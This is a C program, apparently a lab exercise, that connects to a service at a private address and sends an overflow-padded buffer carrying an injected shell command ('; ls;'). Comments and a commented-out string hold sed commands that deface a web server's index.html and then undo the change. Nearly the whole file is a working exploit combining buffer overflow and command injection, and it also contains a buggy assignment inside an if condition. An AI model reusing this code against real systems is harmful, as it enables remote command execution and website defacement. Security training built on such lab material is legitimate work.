#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 512
#define IP "192.168.56.101"
#define PORT 1234
/*
I learned about the buffer overflow from https://www.thegeekstuff.com/2013/06/buffer-overflow/ 
*/
    int sockfd=-1;
    struct sockaddr_in server_addr;
int execute_command(char* command){




    char *Buffer=malloc(BUFFER_SIZE);
    memset(Buffer,'a',117);
    /*
    commands : 
    sed -i 's/<\\/body>/<p>Name<\\/p>\\n<\\/body>/'  to add Name to the body +  /var/www/html/index.html; #
    sed -i '/name/d'       to remove the name from the body

    */
    strncat(Buffer,command,512 - strlen(Buffer) - 1);

    

    // Sending the message to the server
    if (send(sockfd,Buffer,strlen(Buffer),0)<0){
        perror("send failed");
        return 1;
    }
    
    free(Buffer);
    printf("success\n");
    return 0;
}
/*
    char command[]="; sed -i \"s/<\\/body>/<p>baha<\\/p>\\n<\\/body>/\" /var/www/html/index.html; #";

*/
int main (int argc, char** argv){
    char buffer[1024];
    socklen_t server_len = sizeof(server_addr);
    
    char command[]="; ls;";
    memset(&server_addr, 0, sizeof(server_addr));
    int mode = atoi(argv[1]);
    // Configure server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port=htons(PORT);
    server_addr.sin_addr.s_addr=inet_addr(IP);

    if ((sockfd=socket(AF_INET,SOCK_STREAM,0))<0){
        perror("Socket creation failed");
        return 1;
    }
        if (connect(sockfd,(struct sockaddr *)&server_addr,sizeof(server_addr))<0){
        perror("connection failed");
        return 1;
    }
    ssize_t received_bytes = recvfrom(sockfd, buffer, 1024, 0, (struct sockaddr *)&server_addr, &server_len);
        if (received_bytes < 0) {
            perror("recvfrom failed");
            close(sockfd);
            exit(EXIT_FAILURE);
        }

        // Print the received message
        printf("Received: %s", buffer);

    if (execute_command(command )!= 0) return 1;

    if(mode= 1){
        received_bytes = recvfrom(sockfd, buffer, 1024, 0, (struct sockaddr *)&server_addr, &server_len);

        received_bytes = recvfrom(sockfd, buffer, 1024, 0, (struct sockaddr *)&server_addr, &server_len);
        if (received_bytes < 0) {
            perror("recvfrom failed");
            close(sockfd);
            exit(EXIT_FAILURE);
        }

        // Print the received message
        printf("Received: %s", buffer);
    }
    close(sockfd);

    return 0;


}
